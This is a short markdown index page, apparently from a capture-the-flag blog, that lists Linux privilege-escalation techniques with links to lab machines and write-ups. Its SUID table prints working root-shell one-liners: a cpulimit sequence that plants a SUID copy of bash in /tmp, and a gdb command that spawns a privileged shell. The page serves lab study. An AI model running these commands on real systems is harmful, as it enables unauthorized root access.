---
title: PrivEsc
icon: fas fa-info-circle
order: 4
---

The below is a modification from [here](https://github.com/Ignitetechnologies/Privilege-Escalation) !


Table of Contents
=================

* [Abusing Sudo Rights](#sudo)
* [SUID Bit](#suid)
* [Writable /etc/passwd file](#etc)
* [Python Pickle](#pickle)
* [Path Variable](#path)
* [Docker Escape](#docker)

<a name="sudo"></a>
##  Abusing Sudo Rights [⤴](#table-of-contents)

|No.|Machine Name|Reference|Files/Binaries| Description |
|-------|--------------|--------------|----------------|----------------|
|1.|[PYEXP: 1](https://www.vulnhub.com/entry/pyexp-1,534/)|[Reference](../_posts/2021-04-18-PYEXP:1.md)| Python script| exec function |


<a name="suid"></a>
##  SUID Bit [⤴](#table-of-contents)

|No.| Machine Name                 |SUID Bit| Reference | Method |
|-------|------------------------------|-------|-------|--------------------------------------------------------|
|1|[ShellDredd #1 Hannah](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)| cpulimit|[Reference](../_posts/2021-04-15-ONSYSTEM-HANNAH.md)  | cpulimit -l 50 -f cp /bin/bash /tmp/bash <br> cpulimit -l 50 -f chmod +s /tmp/bash <br>  /tmp/bash -p|
|1|[hackmyvm : connection](https://hackmyvm.eu/machines/machine.php?vm=Connection)| gdb |[Reference](../_posts/2021-12-23-connection.md)  | gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit |



<a name="etc"></a>
##  Writable /etc/passwd file [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [PYLINGTON1](../_posts/2021-04-25-PYLINGTON_1.md)|

<a name="pickle"></a>
##  Python Pickle [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [PHINEAS:1](../_posts/2021-05-01-PHINEAS_1.md)|

<a name="path"></a>
##  Path Variable [⤴](#table-of-contents)

|No.| Machine Name   | path  |
|-------|-----------------|--------|
|1.| [Hacksudo:search](../_posts/2021-05-16-Hacksudo_Search.md )|install    |

<a name="docker"></a>
##  Docker Escape [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [pwned](../_posts/2021-12-23-pwned.md)|

